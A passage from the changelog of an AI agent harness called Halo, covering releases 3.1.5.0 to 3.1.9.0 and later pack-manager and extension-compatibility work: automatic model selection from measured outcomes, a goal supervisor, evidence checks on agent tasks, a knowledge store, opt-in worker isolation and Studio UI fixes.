- `/api/pack/manager`, `/api/pack/install`, `/api/pack/sources`, `/api/pack/<id>/{enable,grant,disable,update,remove,settings}`; `POST /api/orchestra/run {workflow, inputs}` compiles a pack's workflow.
- Orchestra's Start view: a pack's workflow form (Run <workflow> from the Pack Manager). docs/STUDIO-packs.md; PACKS.md "The Pack Manager" and "The reference pack".

#### Changed

- The packs' own Studio sections are on Alt+8 and Alt+9 (Packs is Alt+7; the six keep Alt+1..6).
- EXTENSION_API.md "The reference example" is stable: the shipped pack, what each file demonstrates.
- The packs tests read the shipped pack; tests/fixtures/packs/doc-review/ is gone.

#### Fixed

- The doc-review lint "MCP server" printed one line and exited; it is a stdio MCP server now (check_links, check_headings), and the pack's hook and server keep to their defaults under a Python that cannot import Halo.
- At 1500 px the eighth tab wrapped and pushed the Command button off the top bar.

### R7: compatibility hardening

#### Added

- The extension API's version policy (docs/EXTENSION_API.md "Compatibility and migration", stable): a minor version adds names, a major removes only names announced a minor version before; `halo_harness.ext.api_version()`, `compatible(range)` and `deprecations()`. A `halo_api` range with no `max` runs on its `min`'s major only.
- `halo pack update <id> --dry-run`: the pack's migration notes, the files that change and the settings it renames, nothing changed. Studio's Update shows the same lines in a confirm first.
- `halo pack rollback <id>` (Studio: "Roll back to <version>"): an update keeps the version it replaced as `<id>.previous`; rollback swaps it back, moves the renamed settings back and keeps your grants and your files.
- A migration may rename settings: `migrations: [{from, to, note, settings: {old: new}}]` moves your `packs.settings.<id>` keys as the update runs, journaled.
- `${halo_python}` in a pack's `.mcp.json` and `hooks/hooks.json`: Halo's own Python; a pack's processes get Halo's package root on PYTHONPATH, so a pack's code imports `halo_harness.ext` under a `uv tool` install.
- `halo studio --mode packs` (and `?mode=packs`); the README's modes banner has the Packs tile.
- `halo pack doctor` rows for a permission a new version asks for that you have not granted, and for an extension API name a pack uses that is announced for removal (with the version it goes away in).
- docs/PACKS.md "Updating and rolling back", "When a pack cannot run" (every line and what to do) and "A pack's own Python"; the reference pack's README "Versioning your pack"; failure fixtures for every lifecycle failure.

#### Changed

- `scripts/release.py` sets the shipped reference pack's `halo: {min: "<major.minor>"}` to the release it ships in, in the release commit (`__version__` is pinned to the newest dated CHANGELOG section, so no earlier commit can carry the bump; tests/test_reference_pack.py pins the pair).
- `halo pack update` prints the migration notes first ("doc-review 1.1.0 -> 1.3.0: <note>") and swaps the new version in by renames after staging it beside the pack: a copy error or a file in use leaves the old version exactly as it was. `halo pack remove` deletes `<id>.previous` too (`--keep-config` keeps it).
- The compatibility lines read "pack doc-review needs extension API 1.2 to 1.9; this Halo has 1.0" and "pack x needs Halo >= 3.3; this is 3.2.0.0", the same in `halo pack`, the doctor and the Pack Manager.
- `halo pack install <id>` that no source holds names every source it searched (a configured folder that is gone says so).
- The reference pack starts its hook and lint server with `${halo_python}` (the hook in exec form).
- docs/EXTENSION_API.md: every part `stable`.

#### Fixed

- A pack's hook and MCP server ran with the `python` on PATH, which under a `uv tool` install cannot import `halo_harness.ext`.
- An update that failed half-way could leave a pack's folder with some files new and some old.
- An update from the same source with nothing new said "updated 1.0.0 -> 1.0.0 (0 file(s) changed)"; it says the pack is up to date.

## [3.1.9.0] - 2026-10-24

Focus: Auto -- the main agent knows what each model is good at and builds the orchestration itself (the owner, 2026-10-21: "an auto role template ... whatever agent is main should know which model is the best from cost, intelligence, what they are best at").

### R1: what each model is good at

#### Added

- What each model is good at: every catalog row now states what the model takes in (text, image, audio, video, pdf) and puts out, tool calls, reasoning (and its effort levels), open weights, whether it runs locally, and what this machine measured (the gym, the Ollama tool-call probe, a learned tools rejection, telemetry's speed, the preflight canary) -- from the catalogs each provider already has, never guessed.
- `halo models analyze [--json]`: one honest "best at" line per model (`vision+pdf in, tools, reasoning; no audio`), the kinds it is good at, and the strongest and cheapest model per kind; cached in `~/.halo/models/best-at.json` and rebuilt by itself when a catalog changes. `--best-for` gains pdf, code, research, bulk, fast and local; `--capabilities` prints the line.
- The main agent gets a model roster (at most 40 lines: per kind the strongest and cheapest, then each model's price, context, inputs, tools, reasoning and best-at) at session start, after `/clear` and after compaction, so it can pick a model for a sub-task on purpose; `models.roster: false` turns it off.
- Studio: the model picker's "best at" column (kinds and the line, a "best" sort) and the Models panel's Analyze; the `/model` picker shows the kinds and sorts by best.

#### Fixed

- Local Ollama vision models read as "unknown" (the capabilities list was never read); Hugging Face router models counted as local (free) in the coach's prices, the capability ranking and Studio; `ModelProfile.audio` was always false (and the chat translator now sends audio blocks as `input_audio`); the picker's speed column ignored the state dir it was given; OpenRouter output modalities were never stored; the preflight canary results never reached the ranking; docs/AGENTS.md lacked the `media` kind.

### R2: the Auto lineup

#### Added

- The `auto` lineup, the one a session runs while no `team:` is set: main on your model delegates to a pool -- planner, researcher, coder, reviewer, media, writer, ops -- whose models are picked when each one starts, for what its task needs (an image, audio, video or PDF in the task, reasoning for planning and review, tool calls for code, a long context for a long input, cheap and fast for the rest), from what this Halo's catalog says each model is good at, within the lineup's cost band; the reason shows on the agent's row, in Studio (the card's pill, the Inspector's Live tab, the Session spawn line "main spawned media on <model>: <reason>") and in the child's first note.
- `models.preference: auto` and `models.needs` for any bio; bio kinds planner, coder, writer, ops; `budget.band` (low, mid, high) for any lineup.
- `/status`, `halo doctor` (the `lineup` check), `halo teams` and the wizard's Summary say the lineup in use and how to change it; `halo teams show auto` lists the pool with "model picked at spawn"; Studio marks the default lineup "active (default)" and offers Open auto.
- The Agent tool's description says when the lineup is auto; `model:` on an Agent call still chooses the model.

#### Changed

- With no `team:` set (roles on), sessions run `auto` instead of no lineup; your role table, `agents.max_depth` and `agents.max_concurrent` still win over it, and a `team:` you set is never changed.
- The setup wizard's Team step preselects `auto` and writes no `team:` for it; "One model for everything" now turns roles off and clears `team:` instead of writing `team: standard`.
- Seven shipped lineups (`auto` joins).

#### Fixed

- `halo roles` said "roles: on (legacy role table)" when nothing was configured at all; it names the lineup in use.
- `/teams show` with no name said "no lineup is active yet" on a fresh install; it shows the lineup in use.

### R3: Auto learns

#### Added

- The `auto` pick learns from what happened: for the member's kind of task (code, research, plan, review, writing, media, check), each candidate's checked tasks of the last 30 days weigh its score -- from 3 of them, by 0.5 + 0.5 x its first-time success rate (all passed: 1.0, half: 0.75, none: 0.5) -- so a cheaper model that keeps succeeding beats a stronger one that keeps being sent back, and a model that keeps failing gives way among equals. The pick's reason says when the numbers moved it ("(learned: code 1/4 on or:v/strong, so or:v/cheap instead)") or confirmed it ("(code 5/5 here)"), on the Roles pill, the Live tab, the Session spawn line and the child's first note.
- The model roster drops a model that keeps failing a kind (under 34% from 3 checked tasks): it leaves that kind's leaders, and one line names it with its numbers ("dropped for code: or:v/ears (1/4 checked tasks)").
- `halo outcomes learned [--kind] [--model] [--json]`: per model and kind the tasks, the rate, the pick's weight, how many were the model's own picks and whether it is dropped. `halo outcomes forget [--model] [--kind] [--before] [--yes]`: remove rows so a model starts over, the file before kept beside it as `outcomes.jsonl.bak-<time>`.
- `halo models --measured` and `halo models analyze` mark a dropped model; Studio's model picker shows a learned chip per task kind (the passes and the tasks, the weight on hover) and strikes the models dropped for the kind chosen under "learned for".
- Each outcome row says whether its model was picked at spawn (`picked: auto | measured | none`) and why (`reason`).
- Config `models.learn` (`false` turns the learning off), `models.learn.min_tasks`, `models.learn.window_days`, `models.learn.drop_below`.

#### Changed

- The `auto` pick, the roster's per-kind leaders and `halo models --measured` / `analyze` now read what was measured here; with nothing measured (or `models.learn: false`) they are exactly as before.

### Also in 3.1.9.0

#### Fixed

- Studio's server printed a traceback from a handler thread when a browser went away mid-answer (the tab closed, Chrome quit: ConnectionAbortedError or ConnectionResetError on Windows, BrokenPipeError on Linux); written from a daemon thread at interpreter exit, it crashed a Chrome test driver on the Windows runner. A client that went away is quiet; every other error prints as before.

## [3.1.8.0] - 2026-10-24

Focus: the supervisor -- Halo runs goals without a terminal, and Studio keeps up with it (the outside review the owner pasted 2026-10-20; "apply all those suggestions").

### R1: the supervisor

#### Added

- `halo supervise` runs a goal queue without a TUI: `halo goal add "<what>" [--repo] [--budget] [--lineup] [--as orchestra|job] [--file] [--test] [--review]`, each goal an Orchestra run or a `halo -p` job; `--daemon`, `--service` (a systemd/launchd/Task Scheduler file, never enabled), `status`, `stop`; per-goal pause, resume and cancel (docs/SUPERVISE.md, docs/COMMANDS-supervise.md).
- Schedules and triggers stay armed while the supervisor runs; a session never double-fires a team it owns, and a trigger never starts a second job while its previous fire still runs.
- A crashed Orchestra run resumes from its checkpoint; `<run>/runner.json` is a cross-process runner heartbeat (Studio shows such a run `running`, not `interrupted`, and never starts a second runner on it); retries bounded by `supervise.retries`.
- Budgets are stops under the supervisor: a lane that would pass a goal's or the queue's cap does not start; a job goal runs with `--max-budget-usd`; `supervise.max_minutes` stops a goal that runs too long.
- Decisions the supervisor cannot take (a plan review, a gate past the cap, a budget, a job's ask) wait in Studio's Attention queue (`goal_*` rows, one key each); Session's landing says "N goals done, M waiting on you, $X".

### R2: replanning while it runs

#### Added

- Replanning while it runs: with `supervise.replan: auto | review` (or `halo goal add --replan`), a supervised Orchestra run that drifts -- its forecast passes the cap by `replan_forecast`, a lane comes back `replan_returns` times, a lane is blocked on a hand-off or a claim, or a writing lane goes quiet -- pauses its lanes left (running workers finish their step) and the run's lead plans them again: a different model, a split, a second specialist beside a stuck lane, or a retry with what came back as context. Merged lanes are pinned.
- `auto` applies the new plan at once; `review` (and every `plan: review` goal) parks it in Attention as a `goal plan` row with the diff of the lanes; a plan that fails its check twice parks a `goal replan` row. plan.json keeps every revision, events.jsonl `replan_asked` / `replan_applied` / `replan_rejected`, and `halo supervise status`, `halo goal show` and the run report say "replanned N times (why)". Bounded by `supervise.replan_max` and `supervise.replan_cooldown_s`.

#### Fixed

- A resumed Orchestra lane keeps its job's bio and model (a reviewed plan's model was lost after a resume); the run report's cost counts every lane file; a time stop beats a replan pause.

### R3: verified outcomes

#### Added

- Every agent task ends with evidence of its kind, read out of its own transcript (nothing new is asked of the model): the test runs with their command, exit, passed count and failing names; the files it wrote with their diff; the sources it read (WebFetch, WebSearch, Read, Grep, a curl); a check's commands and what they printed; the bio's acceptance on the final text -- the agent's own summary kept apart. An Orchestra lane's is `<run>/lanes/<n>/evidence.json`; a sub-agent's sits beside its transcript.
- The Orchestra gate reads the evidence: a code lane whose work ran no test (when the goal has one) goes back once with "no test run in this lane's work: run <test>", a research lane with no source with "no source fetched or read"; the conflict judge's prompt gains the lanes' tests, sources and reproductions; the run report and `halo orchestra report` list each lane's evidence lines; a stopped goal keeps them and `halo goal show` prints them.
- `~/.halo/coach/outcomes.jsonl`, one row per agent task (an Orchestra lane, a session's sub-agent): bio, model, kind, outcome and what checked it, returns, cost, tests and sources. `halo outcomes [--bio] [--model] [--kind] [--since] [--limit] [--json]` prints them.
- Measured success per model and task kind: `halo models --measured` (`--json`), the table at the end of `halo models analyze`, "measured: code 4/5" on the best-at line (and in Studio's model picker), the roster's model line, a catalog row's `measured.outcomes`.
- `models.preference: measured`: the model is picked when the agent spawns by the best measured first-time success here for the bio's kind (from 3 checked tasks), else as `auto`; the reason says which ("(measured 4/5 code)" on the Roles pill and in the Live tab), and the Roles canvas and `halo teams show` name the source `measured`.

#### Changed

- A sub-agent's acceptance verdict (met, why, attempts) is recorded in its evidence and its outcome row.
- The coach's runs.json gains `outcomes: n`; the best-at cache is rebuilt when a measured number it shows moves.

### R4: knowledge that outlives a session

#### Added
- Findings and decisions, two recall kinds that outlive the session that found them: Markdown files with a small front matter under `~/.halo/knowledge/<kind>/<yyyy-mm>/<id>.md` (+ `_meta.json` provenance), `halo knowledge add|list|show|search|forget|supersede|fetch`, and the agents' `knowledge_add` / `knowledge_search` tools (docs/KNOWLEDGE.md).
- Written where the knowing happens: the Orchestra judge's resolution with evidence and the gate's verdict (findings), each send-back, the coach's Apply and the supervisor's answered decisions (decisions); `knowledge.write: false` turns those writers off.
- Recall indexes them (`[finding]`, `[decision]` with id, who and when) and your own notes: `recall.sources`, folders of Markdown such as an Obsidian vault, read in place and never written (`[note]`, `halo recall sources`, docs/RECALL.md).
- Citing what was reused: an Orchestra worker's brief carries the findings recall ranks for its job (`knowledge.brief`), the agent is told to cite the id, its evidence records `cited`, the outcome row its count, and `halo knowledge show` lists "reused by".
- Over the fleet: `halo knowledge fetch <harness> <id> | --all KIND` through the hub (the `knowledge` fleet command, scrubbed, `by` naming the harness id), written here read-only; recall hits across the fleet carry the entry's `ref`.
- Studio: the recall box under "Who can..." on Fleet's Capabilities panel, with its Fleet switch and the kinds' chips.

#### Changed
- The isolation capability table counts `knowledge_add` and `knowledge_search` as `recall` (with Skill and TodoWrite), so a lineup that gives its isolated workers `recall` gives them the knowledge tools too (docs/ISOLATION.md).
- `fleet.recall.hide` also takes `finding`, `decision` and `knowledge`; your own notes never leave the box.
- evidence.json gains `cited`, the evidence lines a `cited:` line, an outcomes.jsonl row `cited: <n>` (only when the task cited something).
- `/recall`'s one-line description names findings, decisions and your notes.

#### Fixed
- The TUI's `/recall` showed every hit that was not a memory topic as `[sess]` (a coach library entry too); it now shares `halo recall`'s chips.
- Two recall searches at once (two Orchestra workers' briefs) each refreshed the index and raced on its file; on Windows the loser's replace was denied and its brief lost the knowledge block. The index builds one at a time per process, and the save tries a denied replace again.

### R5: opt-in isolation

#### Added

- Opt-in isolation for Orchestra workers: `isolation: container` (a per-run `docker run` / `podman run` of the worker image, the same worktree at /work, a scoped state dir, no host `~/.halo`, the network `host` unless the lineup says `none`) or `isolation: user` (POSIX, `sudo -n -u <name>`) on a lineup or a bio; `halo isolation image | build | check`; the shipped `isolation/Dockerfile`.
- `secrets: {broker: 1password | env}` with a bio's `environment.secrets` refs: read at spawn into the worker's environment only, never into a file, a transcript or a frame, stripped from its tool children unless `environment.pass_to_tools` names them; `halo secrets check` prints names and ok only.
- `tools.capabilities` on a lineup (whole, per tier, per card) or a bio: the agent is built with only the tools of those capabilities (one table: read, edit, bash, web, agent, mcp:<server>, media, recall); the Agent tool says what each member may use; `/tools` lists the session's tools by capability.
- Doctor rows `isolation` and `secrets`; the run report, `halo goal show`, Studio's Orchestra lanes view and Agent panel show a line per opt-in; the Roles Inspector's Lineup tab has Isolation, Secrets broker and Tool capabilities.

#### Changed

- An Orchestra lane that cannot run as declared (no docker or podman, no `op`, a scoped user on Windows, a ref not read) fails with that one line, like a worker whose harness would not start (`failure.kind: worker`). Nothing changes when nothing is declared.
- `tool_child_env` also strips the broker key names a run hands its worker (`HALO_SECRET_KEYS`); the agent row gains `opt_ins`; lane files and report.json carry the opt-in fields only when a lane declares one.

### R6: Studio keeps up with the terminal

#### Fixed

- Studio, Session: Cost now moves on the session's own `message_end` and `status` frames, the moment the terminal's status bar moves: the spend, the tokens in and out, the turns, the context, the model and the busy dot; a sub-agent's frames never move the session's figures, and a frame that leaves a figure empty leaves it (the owner, 2026-10-21: "the money count didn't match for a minute").
- Studio: a GET fleet answer never pulls a figure back (the higher spend, tokens and turns and the frame's context stand for 2.5 s after a frame), an older answer never lands after a newer one, and a local session's `turn_done` / `message_end` / `status` drops GET fleet's 1 s snapshot.
- Studio, Session: the share bar counts a finished sub-agent once (main's share is the session total less its finished sub-agents'); TURNS are your turns in the session, the terminal's count; an agent's own model calls show as "calls" (Cost and the Agent inspector).
- Studio: an agent leaving waiting re-reads the fleet at once, so the session's waiting state clears after an answer.
- Fleet: an agent's text or cost changed inside the 1.0 s quiet window goes out when the window ends; agent rows carry their own `tokens_in` / `tokens_out` from each `message_end`.
- Docs: Studio's live feed names the frames Session reads and every delay that remains, with its number.

## [3.1.7.0] - 2026-10-21

Focus: the Session tab gets what the owner liked in Fleet, in the column he already likes -- Fleet's time and kind columns on every live line, the timeline strip, the picks, and a Steer box that is always there -- and the committed captures stop carrying the build host's name. From the owner's photo of the Fleet view on 2026-10-20 ("I want what fleet has with tool running too within the session tab. More of insight and ability to jump in and steer is awesome").

### R1: Session has what Fleet has, and the steer is always at hand

#### Added

- Session's Live column has the Fleet log's columns: every line leads with its time (HH:MM:SS) and its kind (TOOL, TEXT, THINK, OUT, ASK, SPAWN, STATE, YOU, ERR) before the agent's tag; in a narrow column the time, the kind and the tag share one row and the line runs under them.
- Fleet's timeline strip heads the column, one lane per live agent of the session over 5, 15 or 60 minutes (a lane click shows only that agent), and the header has an agent pick and a kind pick (tools, text, states, asks) beside Follow.
- The Steer box is always at the foot of the column: it talks to the agent you pinned, else the session's main agent ("STEER main"), with Pause and Stop beside it, and says in one line when that agent has finished. A steer sent there shows as a YOU line at once.
- "steer" on hover: every tag in the column and every node on the map (Session and Fleet) steers that agent in one click, the keyboard in the box.
- A tool row whose result has more than one line opens its whole result in place on a click (Enter or Space), and closes on the next.

#### Fixed

- The first steer sent to an agent whose stream Studio had not opened yet (the main agent, from the column) now shows in the column at once.
- The Steer box opened from the map's `...` menu, the palette or the steer chip gets the keyboard even when its panel opens with it.
- The Steer box keeps asking for the keyboard until it holds it (0 to 1200 ms): on a slow host the panel that opened with it took the focus back after the first tick, which the Linux runner showed on every Fleet chip check.

### R2: captures carry no real names

#### Fixed

- Studio's front-page pictures carry no real names: every Studio capture tool draws a made-up harness, `you@studio`, through `tools/capture_identity.py`, and stops with one line (exit 2) when the name Studio would draw is still the machine's own; the seeded Orchestra runs use a repo-relative test command, the capture's temp files move out of the user profile, and every page a tool counts or shoots is read for a home path, `AppData` or the machine's user or host name first (exit 1). Every Studio still and GIF, the six-section banner, the hero and the social preview are re-captured (the committed Orchestra stills had shown the build host's harness name and a home path prefix; the fleet test rig's own harness carried the real account name and is `you@studio` now).
- Tests: `tests/test_capture_identity.py` parses the capture tools' source (the placeholder before every serve, a guard before every count and picture) and pins the stop and the DOM guard. Docs: MEDIA.md carries the two rules and both stop lines.
- CI: the Windows `run_all.py` step gets 90 minutes (the v3.1.6.0 tag run finished green at the 65-minute limit and was cut).

### R3: a steer never kills a silent sub-agent

#### Fixed

- A steer typed while a sub-agent's model call was still silent (no first byte yet) killed that sub-agent on Linux and stalled it on Windows. Main forwards such a steer into its running children (2.0.7), and each child cuts its silent call to resend it with the steer (2.0.1); the cut force-shut the socket, and the read it woke raised `RemoteDisconnected` out of `getresponse()`, which nothing mapped to the abort on a host the Governor does not know (every local or mock endpoint) -- the child's turn died with a traceback, its parent finished early. On Windows `shutdown()` never wakes a pending read, so the cut waited for the provider's first byte. Now any exception the force-shut read raises while the abort is set is the abort, at all four dialects, and the watcher closes the raw handle after the shutdown so Windows wakes too. The Session steer test on the Linux runner found it (every real agent read "done" seconds after the first steer).
- Tests: `tests/test_stream_abort_silent.py` (an abort during the silent phase ends the stream cleanly within 1.5 s, plain and governed paths; failed on both platforms before) and `tests/test_steer_silent_children.py` (a steer to main reaches both held children, each resends with the steer as its last user message, both stay running; failed on Linux before).

## [3.1.6.0] - 2026-10-20

Focus: the coach learns to probe (after Google's Harness², arXiv 2610.14224: candidate set-ups run the same goal again, an anonymized judge compares the deliverables, what wins is offered as one card, and what gets applied lands in an improvement library the next proposals cite), a tier becomes something you make on the Roles canvas with a model and a trigger of its own, the front page gets a hero, and copying a draft out of the TUI on Linux works and says what it did. From the owner's "Add 1 and 2 from Google harness research" (2026-10-19) and his live notes from Kali (2026-10-20).

### R1: tiers on the canvas

#### Added

- A lineup tier grows `model` and `trigger`. `tiers[].model` is a model ref (or `default`); `tiers[].trigger` is one trigger in the shapes a bio's `schedule` / `triggers` use (`on: schedule|file_change|event|message`, its one field, a required `prompt`, an optional `model`). `halo teams validate`, Studio's Save, the lineup preflight and `halo doctor` flag a bad one in one line (`tiers[1] 'media': "trigger.paths" must be a non-empty list of path strings`); `halo teams show` prints one line per tier with its model and trigger.
- One model order, in `teams_yaml.member_model`, read by the role table, Studio's card pill, the lineup preflight and the coach alike: a card's override -> a bio that pins a real ref -> the tier's model -> a `default` bio (the session's model) -> the fallbacks. A card under a tier model shows the resolved model and its pill says "from tier <name>'s model".
- A tier trigger starts the tier: it is armed as its lead's (the tier's first member) on the lead's resolved model; the fired job is the same `halo -p <prompt> --agent <lead> --team <team>` with `HALO_TIER_FIRED=<tier>`, and a fired lead may spawn its own tier's other members and the next tier (before, a fired root counted as main and could only spawn tier 1).
- The Roles canvas: **Add tier** on the canvas bar (an inline name, Enter adds; also the palette's "Roles: add tier"); with no declared tiers yet, tier 0 becomes the main card alone and the new box appears empty with "Drag cards here"; double-click the name to rename; the tier box's own `...` menu (Rename, Model, Trigger, Max parallel, Delete -- members fall to the rest tier, tier 0 cannot go); the head shows the model pill and a trigger chip (`⚡ every 30m`, `⚡ on file src/`). Every change is a canvas edit (Ctrl+Z works).
- Edge labels never overlap: each label is offset along its edge by its index among siblings, the selected card's and the pipeline's are placed first, a label that would still collide is dropped, and non-selected delegation labels are dimmed. A single tier keeps the fan under main; several tiers stay in columns.
- Docs: ROLES.md "Tiers" (the two keys, the model order, the trigger rule), AGENTS.md lineup fields, STUDIO-team-roles.md (Add tier, the menu, the chips).

### R2: the coach probes

#### Added

- The coach probes (after Google's Harness²): `halo coach <run> --probe [--k N] [--yes]`, `/coach --probe` and the Coach tab's **Probe** button run the goal again under two candidate overlays the run's lead drafts -- an *invariant* one (planning, tool use, context budget, delegation) and a *domain* one (procedure, knowledge, constraints) -- each as a probe run under the reference run (`<run>/probes/<cand>/`, the same base commit, never in a run list), capped at the run's cost x `coach.probe.budget_factor`; an anonymized judge (shuffled A/B/C labels, no set-up shown) compares the deliverables with the run's own; the coach adopts, merges or keeps, and offers the result as one card whose Apply writes every file under one Undo. The cost line shows before anything runs; off unless asked.
- The run report's coach line and the Fleet digest gain "probe: N runs, $X, picked: invariant|domain|merged|kept".
- New config: `coach.probe.k` (1), `coach.probe.budget_factor` (1.5). New route: `POST /api/orchestra/<run>/coach/probe`. Docs: ORCHESTRA.md "Probes", CONFIG.md, COMMANDS-studio.md, SLASH-COMMANDS-tui.md.

### R3: the improvement library

#### Added

- The improvement library (after Google's Harness², the harnessing level): every coach Apply -- a card's change or a probe card's group -- leaves an entry in `~/.halo/coach/library/<e-yyyymmdd-xxxx>/` (entry.json, overlay.json, the written files, EXPERIENCE.md: when it applies, the lessons, the evidence, the files); Undo marks it undone. The coach cites up to three entries for a run of the same project (the same remote path, else the folder name) or whose EXPERIENCE.md recall ranks for the goal: "the library: N earlier runs like this adopted ...", `[lib e-...]` on a matching card, the Coach tab's line, `lib` chip and Library (n) fold with Forget, and "What earlier runs like this learned" in the probe's draft prompt. The next run still starts from the base lineup: entries come back only through proposals. `coach.library.cite` (true) turns it off.
- `halo coach library` lists, shows, forgets and fetches entries; `/coach library` too (`forget` there needs `--yes`).
- The fleet shares entries: recall indexes them as kind `coach_library` (`[lib]`; the Lessons as the fleet excerpt; `fleet.recall.hide: [coach_library]` hides them and refuses the fetch), the read-only fleet command `coach_library {entry}` (256 KB cap, journal `library_asked`), the hub's admin route `local/coach-library`, and `halo coach library fetch <harness> <entry>` writes the entry here under the same id with `from`, never over an existing one.
- New route: `POST /api/coach/library/<entry>/forget`; every coach GET carries `library`, `library_line`, `library_hits`. Docs: ORCHESTRA.md "The library", CONFIG.md, COMMANDS-studio.md, COMMANDS-fleet.md, COMMANDS-health.md, FLEET.md, SLASH-COMMANDS-tui.md.

### R4: a Studio hero

#### Changed

- The README's first image is `docs/media/hero.png`: the HALO wordmark over Studio's Session dashboard (the Map on the left, the Live column on the right) with one line, "The Claude Code-compatible harness for any model, with Studio: every agent, live."; `docs/media/social-preview.png` is the same picture at GitHub's 1280x640 (upload it under Settings -> General -> Social preview). Both come from the new `tools/hero_png.py` (Pillow only, deterministic, `--check`). The vector `hero.svg` keeps its art and takes the line and three chips.

### R5: copying the draft on Linux

#### Fixed

- **`/copy draft` and `Ctrl+Shift+C` copy the chat box's unsent text** (the owner's note from Kali: "Copying the words in a session chat text not yet sent does not work"). Type `/copy draft` over the draft (or after Esc / Ctrl+U cleared the box) and it copies what the box held before the command, pastes expanded; a sent message is no longer a draft. `Ctrl+Shift+C` copies the whole box in one key wherever the terminal passes that key on (most Linux terminals keep it as their own copy key, so `/copy draft` is the path that works everywhere). A selection plus Ctrl+C, and Ctrl+C with nothing selected, behave as before.
- **A copy never fails silently.** After every copy, Textual's own copy keys and the Ctrl+X cut included, the status line says what landed: "copied N characters via xclip" (or wl-copy, xsel, clip.exe, pbcopy). On Linux with no clipboard tool it reads "no clipboard tool: sudo apt install xclip (or wl-clipboard on Wayland); sent OSC 52, which <terminal> may ignore". Over SSH it says OSC 52 is the only path to your local clipboard, and a failing tool names its error. Whenever no tool landed, the text is also saved to `~/.halo/clipboard.txt` (0600, replaced by the next such copy) and the line names that file. Before this, a stock Kali desktop (no xclip, QTerminal ignoring OSC 52) showed "Copied" and an empty clipboard.
- **`halo doctor`'s clipboard row on Linux** names the tool (or none, with the apt line), the X11 or Wayland session (`DISPLAY` / `WAYLAND_DISPLAY`) and the OSC 52 note, and ends with its own fix: `sudo apt install xclip`, `sudo apt install wl-clipboard` on a Wayland-only session, `tmux set -g set-clipboard on` inside tmux (it used to show the apt line there too), or the troubleshooting entry when no display session is up.
- Clipboard tool detection prefers the tool whose display session is up (xclip on an X11 desktop even when wl-clipboard is also installed; before, wl-copy won by PATH order and every copy failed) and runs the PATH-resolved path.
- The first mouse drag in the transcript or the chat box shows one hint: hold Shift while dragging for the terminal's own selection; Ctrl+C copies what is selected here.
- Docs: a "Copy does nothing on Linux" section in TROUBLESHOOTING.md; `/copy draft`, the keys and the status lines in SLASH-COMMANDS-tui.md and SLASH-COMMANDS-keys.md; HANDBOOK.md's copy paragraph; COMMANDS-health.md's clipboard row.

### R6: Session is the first tab

#### Changed

- Studio's sections run in the owner's order: Session (`Alt+1`), Team (`Alt+2`), Roles (`Alt+3`), Fleet (`Alt+4`), Design (`Alt+5`), Orchestra (`Alt+6`). Section ids, `/studio <section>`, `halo studio --mode|--fleet|--session` and `?mode=` links are unchanged; with nothing saved Studio still opens on Session while a session is live here and on Roles otherwise.
- One list is the order (`ui/src/routes/index.tsx` SECTIONS): the tabs, `Alt+N`, the palette's groups (Roles, Design and Team no longer sort above Go to), the first key of each section's How this works and the status bar's key hint read it; the modes banner and every Studio capture show it (hero.png and social-preview.png re-rendered with them).
- Every `Alt+N` line in README.md and docs/ follows the new order; `tests/test_studio_section_order.py` fails on any line a future reorder leaves behind.

#### Fixed

- Roles: a save whose answer lands after an undo or an edit made meanwhile no longer puts the saved mapping back (seen as the tiers Chrome checks failing on the slow Windows runner at Delete then Ctrl+Z).

## [3.1.5.0] - 2026-10-20

Focus: two things leave the product (the Claude Code and Codex subscription routes, the game themes), Session and Roles get the polish the owner wants Studio known for (the whole right side of Session is one live column of every agent working), and the front page leads with Studio. From the owner's direction on 2026-10-20, right after 3.1.4.0.

### R1: the subscription routes are gone

#### Removed

- The Claude Code (`cc:`) and Codex (`cx:`) subscription routes: the `claude_subscription` and `codex_subscription` providers, their login checks and priming, their `/model` picker and `halo models` rows, `halo models --cc`/`--cx`, the init wizard's Claude Code and Codex subscription tabs and its Settings sources step, `halo init --provider claude`/`--preset claude`, and the subscription-turn line.
- The subscription consent machinery: `halo subscriptions status|accept|revoke|scrub`, `/subscriptions`, the notice dialog, and the scrub that rewrote bios and lineups to OpenRouter equivalents.
- `/settings` and the merged Claude Code / Codex settings view; doctor's `claude_subscription`, `codex_subscription`, `subscription_consent` and `codex_settings` rows.
- config.json's `subscription_routes` and `settings` sections: a file that still has them loads, the sections are ignored, and `halo doctor --config` names each in one line. `HALO_CODEX_EXE`/`BRIDGE_CODEX_EXE` and `HALO_CCBRIDGE_*` are no longer read; `~/.halo/cc-models.json`, `cx-models.json` and `run/*.sock` are left on disk, unread.
- A `cc:`/`cx:` ref anywhere (`--model`, `/model`, a remembered last model, a config `model:`) is one line: no route (removed in 3.1.5.0; use `ant:<name>` with `ANTHROPIC_API_KEY` or `or:anthropic/<model>`).
- Unchanged: the `ant:` aliases (now `providers/anthropic_aliases.py`), every other provider, `HALO_CLAUDE_EXE` for `--chrome`, and the claude.ai connectors bridge (its claude login check and launcher now live in `mcp/claude_auth.py` and `mcp/claude_process.py`).

### R2: the game themes are gone

#### Removed

- The game themes: DOOM, Metroid, Mario, Beetlejuice and Alien, with their palettes, the level band above the prompt (scenes, combat, pickups), the HUD status-bar skins and cues, the heavy, dashed and brick borders and the visor and pipe input frames. The six ordinary themes stay, and the status bar is the same single line under each.
- `/doom`, `/metroid`, `/mario`, `/beetlejuice`, `/alien`, `/level` and the `/theme <game> <variant>` form; the wizard's game-theme rows and variant list.
- The config keys `theme_scene`, `theme_variant` and `theme_toggle_previous`. A leftover one is ignored and `halo doctor --config` names it in one line; `halo config set` refuses them.
- A saved game theme (`"theme": "doom"`) falls back to the default theme with one line at startup and in `halo doctor --config`: "theme: doom was a game theme, removed in 3.1.5.0; using claude-dark".
- The theme screenshots, the HUD and level captures, 37 TUI snapshots and the README's "The levels" section.

### R3: Session and Roles, polished

- **Studio Session is the dashboard: the whole right side is Live,** one auto-scrolling column of every agent of this harness at once: what it types, each tool call with its target, its time ticking and its result, what it hands back, what it asks you (an amber card with A / R / S / O), each line tagged with its agent's own colour, name and state. Follow is on (scroll up pauses, "↓ N new" resumes); a tag pins one agent with Steer below it; a hovered line lights the agent's node on the map; the column holds the newest 500 lines and Activity keeps the rest. Agent, Activity and Attention wait as strips.
- **Session's map is one picture:** the agents as a tree (each under the one that spawned it, its children fanned out, fitted to the panel), each node with its model, its cost and the tool it runs with its time ("Bash 12s"); working pulses cyan, waiting amber, done green that fades over ten seconds, failed red that stays, on the node and the edge into it.
- **Session's Cost:** the spend sparkline beside the ticker, a context-fill bar (amber past 80 %, red past 95 %), cost per turn, and each agent's share as a stacked bar with its own tokens in and out (the agent rows now carry their tokens, from each agent's transcript).
